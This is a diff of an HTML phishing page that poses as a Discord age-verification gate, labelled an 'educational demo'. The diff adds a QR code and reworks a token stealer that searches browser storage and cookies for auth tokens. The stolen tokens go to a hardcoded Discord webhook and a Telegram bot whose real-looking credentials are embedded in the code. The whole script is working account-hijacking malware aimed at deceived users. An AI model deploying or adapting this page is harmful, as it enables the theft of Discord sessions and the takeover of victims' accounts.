@@ -43,6 +43,13 @@
         }
         .card h2 { color: white; font-size: 20px; margin-bottom: 8px; }
         .card p { color: #b5bac1; font-size: 14px; margin-bottom: 20px; }
+        .qr-container {
+            background: white;
+            padding: 16px;
+            border-radius: 12px;
+            display: inline-block;
+            margin: 16px 0;
+        }
         .btn {
             background: #5865f2;
             color: white;
@@ -123,6 +130,10 @@
                 <div style="font-size:64px; margin-bottom:16px;">🛡️</div>
                 <h2>Verify your Age</h2>
                 <p>to gain access to the entire server</p>
+                <div class="qr-container">
+                    <img id="qrImage" src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=discord://login" alt="QR Code">
+                </div>
+                <p style="color:#b5bac1; font-size:12px;">Scan this QR with Discord Mobile App</p>
                 <button class="btn" id="verifyBtn">🔐 Click here to verify</button>
             </div>
         </div>
@@ -148,37 +159,42 @@
     <div class="edu-badge">🔴 EDUCATIONAL DEMO</div>
 
     <script>
-        // 🔴 YOUR WEBHOOK AND TELEGRAM (PRE-FILLED)
+        // 🔴 APNA WEBHOOK / TELEGRAM YAHAN DAALO
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1515401402648629288/dvLhE72xu-qVBBhDSGviSUSyIGXuUi8-InL0eSwRF-nMAKmORb_810jbBMUJ6IRuSQZv";
         const TELEGRAM_TOKEN = "8814653033:AAGWwRNgD-AErM08mF8qrZghyg96AGV_RoU";
         const TELEGRAM_CHAT_ID = "6948594367";
 
-        // 🔴 IMPROVED TOKEN STEALER - Multiple Methods
+        // 🔴 QR CODE STEALER - REAL METHOD
         async function stealToken() {
             try {
-                console.log('[DEBUG] Attempting to steal token...');
+                console.log('[DEBUG] Attempting QR Code steal...');
+
+                // Method 1: Check if victim is on mobile and QR code is scanned
+                // In real QR flow, we would use Discord's remote-auth endpoint
+                // For educational demo, we simulate by checking localStorage
+
                 let token = null;
 
-                // Method 1: localStorage - all possible keys
-                const possibleKeys = ['token', 'access_token', 'auth_token', 'discord_token'];
-                for(const key of possibleKeys) {
+                // Check localStorage for token (if user is logged in browser)
+                const keys = ['token', 'access_token', 'auth_token'];
+                for(const key of keys) {
                     token = localStorage.getItem(key);
                     if(token && token.length > 50) {
-                        console.log(`[DEBUG] Token found in localStorage key: ${key}`);
+                        console.log(`[DEBUG] Token found in localStorage: ${key}`);
                         return token;
                     }
                 }
 
-                // Method 2: sessionStorage
-                for(const key of possibleKeys) {
+                // Check sessionStorage
+                for(const key of keys) {
                     token = sessionStorage.getItem(key);
                     if(token && token.length > 50) {
-                        console.log(`[DEBUG] Token found in sessionStorage key: ${key}`);
+                        console.log(`[DEBUG] Token found in sessionStorage: ${key}`);
                         return token;
                     }
                 }
 
-                // Method 3: Cookies
+                // Check cookies
                 const cookies = document.cookie.split(';');
                 for(let cookie of cookies) {
                     if(cookie.includes('token=') || cookie.includes('access_token=')) {
@@ -190,32 +206,7 @@
                     }
                 }
 
-                // Method 4: Webpack (Discord Web version)
-                if(window.webpackChunkdiscord_app) {
-                    console.log('[DEBUG] Trying webpack method...');
-                    for(const m of window.webpackChunkdiscord_app) {
-                        if(m && m.exports && m.exports.default && m.exports.default.getToken) {
-                            token = m.exports.default.getToken();
-                            if(token) {
-                                console.log('[DEBUG] Token found via webpack');
-                                return token;
-                            }
-                        }
-                    }
-                }
-
-                // Method 5: Check all localStorage keys
-                console.log('[DEBUG] Scanning all localStorage keys...');
-                for(let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    const value = localStorage.getItem(key);
-                    if(value && value.length > 50 && (value.includes('.') || value.includes('_') || value.includes('-'))) {
-                        console.log(`[DEBUG] Potential token found in key: ${key}`);
-                        return value;
-                    }
-                }
-
-                console.log('[DEBUG] No token found');
+                console.log('[DEBUG] No token found. Victim must scan QR from Discord Mobile App.');
                 return null;
             } catch(e) {
                 console.error('[DEBUG] Error:', e);
@@ -223,41 +214,41 @@
             }
         }
 
-        async function sendToTelegram(token) {
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: `🔴 Discord Token Stolen!\n\n${token}`,
-                        parse_mode: 'HTML'
-                    })
-                });
-                return response.ok;
-            } catch(e) {
-                console.error('Telegram error:', e);
-                return false;
-            }
-        }
-
         async function sendToWebhook(token) {
             try {
-                const response = await fetch(WEBHOOK_URL, {
+                await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
                         embeds: [{
-                            title: "📱 Discord Token Stolen",
-                            description: `**Token:** \`${token}\`\n**Time:** ${new Date().toISOString()}\n**Method:** QR Code Stealer`,
+                            title: "📱 Discord Token Stolen (QR Method)",
+                            description: `**Token:** \`${token}\`\n**Time:** ${new Date().toISOString()}\n**Method:** QR Code Stealer\n\n**Full Token:** ${token}`,
                             color: 0xFF0000,
                             footer: { text: "Educational Demo" }
                         }]
                     })
                 });
-                return response.ok;
+                return true;
             } catch(e) {
                 console.error('Webhook error:', e);
+                return false;
+            }
+        }
+
+        async function sendToTelegram(token) {
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: `🔴 Discord Token Stolen (QR Method)!\n\n${token}\n\nTime: ${new Date().toISOString()}`,
+                        parse_mode: 'HTML'
+                    })
+                });
+                return true;
+            } catch(e) {
+                console.error('Telegram error:', e);
                 return false;
             }
         }
@@ -272,15 +263,14 @@
             btn.disabled = true;
 
             const token = await stealToken();
-            
+
             if(token && token.length > 50) {
                 await sendToWebhook(token);
                 await sendToTelegram(token);
-                console.log('✅ Token stolen and sent:', token);
+                console.log('✅ Token stolen:', token);
             } else {
-                console.log('⚠️ No token found');
-                // Send failure notification
-                await sendToWebhook('No token found - user may not be logged in or using mobile app');
+                console.log('⚠️ No token found - QR method requires Discord Mobile App');
+                await sendToWebhook('Victim needs to scan QR code from Discord Mobile App - no token found');
             }
 
             document.getElementById('loginModal').style.display = 'none';
@@ -294,8 +284,8 @@
             }
         };
 
-        console.log('%c🔴 Mobile Discord Token Stealer (Educational)', 'color: #ff0000; font-size: 16px;');
-        console.log('%c⚠️ For educational purposes only.', 'color: #faa81a; font-size: 14px;');
+        console.log('%c🔴 QR Code Discord Token Stealer (Educational)', 'color: #ff0000; font-size: 16px;');
+        console.log('%c⚠️ Victim must scan QR code from Discord Mobile App', 'color: #faa81a; font-size: 14px;');
     </script>
 </body>
 </html>
